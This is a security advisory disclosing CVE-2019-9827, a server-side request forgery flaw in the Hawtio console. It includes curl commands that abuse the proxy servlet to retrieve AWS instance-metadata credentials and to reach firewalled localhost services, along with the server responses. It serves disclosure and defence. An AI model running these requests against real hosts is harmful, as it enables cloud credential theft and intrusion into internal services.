@@ -1,0 +1,161 @@
+id: 32953
+date: 07/03/2019
+title: Hawtio 2.5.0 Server Side Request Forgery Vulnerability
+author: CipherTechs
+cves: CVE-2019-9827
+
+Hawtio Server-Side Request Forgery
+
+
+Introduction
+============
+Hawtio (https://hawt.io/) is a modular web console for managing Java.
+CipherTechs discovered that Hawtio up to and including version 2.5.0
+is vulnerable to unauthenticated Server-Side Request Forgery (SSRF).
+
+
+CVE
+===
+CVE-2019-9827
+
+
+Affected Platforms and Versions
+===============================
+Product: Hawtio
+Version: <= 2.5.0
+
+
+Vulnerability Overview
+======================
+Security risk: Medium
+Attack Vector: Remote
+Vendor Status: Notified
+
+
+Vulnerability Description
+=========================
+Hawtio by default allows for any unauthenticated user to visit the proxy servlet page (/hawtio/proxy/). 
+Appending a destination server onto /proxy/ will forward the request from
+the Hawtio server. This can be especially dangerous in AWS environments as
+it's possible to request instance Metadata and retrieve sensitive information including access keys.
+This vulnerability is also dangerous as it could expose internal 
+applications which allow connections from the Hawtio server's IP address.
+
+
+Technical Details
+=================
+By default, versions >= 1.5.0 have a whitelist which only allow connections to 127.0.0.1.
+Although the default whitelist settings prevent an attacker from making a
+request to any servers outside of the localhost - an attacker could still
+request any internal service on the local Hawtio host.
+
+For any Hawtio versions < 1.5.0 an unauthenticated can use the proxy servlet to make a request to any server.
+
+Hawtio <= 1.4.68 - Obtaining AWS Access Keys via SSRF
+-----------------------------------------------------
+
+  $ curl -i http://hawtio-target:8080/hawtio/proxy/http://169.254.169.254/latest
+        /meta-data/identity-credentials
+        /ec2/security-credentials/ec2-instance
+  HTTP/1.1 200 OK
+  X-Frame-Options: SAMEORIGIN
+  X-XSS-Protection: 1
+  Access-Control-Allow-Origin: *
+  Content-Type: text/plain
+  Accept-Ranges: bytes
+  ETag: "3876041485"
+  Last-Modified: Thu, 21 Mar 2019 19:36:06 GMT
+  Content-Length: 1318
+  Date: Thu, 21 Mar 2019 19:58:45 GMT
+  Server: EC2ws
+
+  {
+    "Code" : "Success",
+    "LastUpdated" : "2019-03-21T19:35:50Z",
+    "Type" : "AWS-HMAC",
+    "AccessKeyId" : "[REDACTED]",
+    "SecretAccessKey" : "[REDACTED]",
+    "Token" : "[REDACTED]",
+    "Expiration" : "2019-03-22T01:38:33Z"
+
+As shown above using the proxy servlet allows any user to obtain AWS metadata information.
+
+Hawtio 2.5.0
+------------
+
+  $ curl -i http://hawtio-target:8080/hawtio/proxy/http://169.254.169.254/latest
+        /meta-data/identity-credentials
+        /ec2/security-credentials/ec2-instance
+  HTTP/1.1 403 Forbidden
+  Date: Thu, 21 Mar 2019 20:06:16 GMT
+  Cache-Control: max-age=0, no-cache, must-revalidate, 
+        proxy-revalidate, private
+  Pragma: no-cache
+  Access-Control-Allow-Origin: *
+  X-Frame-Options: SAMEORIGIN
+  X-XSS-Protection: 1
+  X-Content-Type-Options: nosniff
+  Content-Security-Policy: default-src 'self'; script-src 'self'
+        'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';
+        font-src 'self' data:; connect-src 'self'; frame-src 'self'
+  Content-Type: application/json
+  Content-Length: 29
+  Server: Jetty(9.4.z-SNAPSHOT)
+
+  {"reason":"HOST_NOT_ALLOWED"}
+
+That said, an attacker could still access arbitrary internal services and bypass ingress traffic rules on Hawtio 2.5.0. 
+A demonstration can be found below.
+
+  hawtio$ sudo ufw status numbered
+  Status: active
+
+       To                         Action      From
+       --                         ------      ----
+  [ 1] 8080                       ALLOW IN    Anywhere
+  [ 2] 127.0.0.1 80/tcp           ALLOW IN    127.0.0.1
+  [ 3] 22/tcp                     ALLOW IN    Anywhere
+
+        $ curl -i http://hawtio-target/test.txt
+  curl: (7) Failed to connect to hawtio-target port 80: 
+        Connection refused
+
+        $ curl -i http://hawtio-target:8080/hawtio/proxy/http://127.0.0.1/test.txt
+  HTTP/1.1 200 OK
+  Date: Thu, 21 Mar 2019 20:18:34 GMT
+  Cache-Control: max-age=0, no-cache, must-revalidate, proxy-revalidate, private
+  Pragma: no-cache
+  Access-Control-Allow-Origin: *
+  X-Frame-Options: SAMEORIGIN
+  X-XSS-Protection: 1
+        X-Content-Type-Options: nosniff
+        Content-Security-Policy: default-src 'self'; script-src 'self'
+        'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';
+        font-src 'self' data:; connect-src 'self'; frame-src 'self'
+  Server: SimpleHTTP/0.6 Python/2.7.13
+  Date: Thu, 21 Mar 2019 20:18:34 GMT
+  Content-Type: text/plain
+  Last-Modified: Thu, 21 Mar 2019 20:07:34 GMT
+  Content-Length: 11
+
+  Secrets...
+
+Recommendations
+===============
+Upgrade to at Hawtio >=-1.5.0 to prevent SSRF from accessing arbitrary URLs. Services listening on localhost can still
+be accessed through SSRF exploitation in versions > 1.5.0 so CipherTechs recommends disabling the proxy servlet
+entirely. CipherTechs did not exhaustively test Hawtio so it is still not recommended to expose this developer tool on 
+the Internet. 
+
+In terms of protecting AWS data, a daemon developed by Netflix-Skunkworks can be implemented to block 
+all connections to AWS metadata (169.254.169.254). Only a designated user who runs the proxy daemon can access the 
+metadata service. CipherTechs published a blog post to
+implement this solution here:  https://www.ciphertechs.com/protecting-aws-metadata-from-zero-day-ssrf-attacks/
+
+Timeline
+========
+2019.02.25 - Vulnerability Discovered by CipherTechs
+2019.03.27 - Redhat Notified
+2019.06.27 - 90 day disclosure date
+
+#  0day.today [2023-03-21]  #
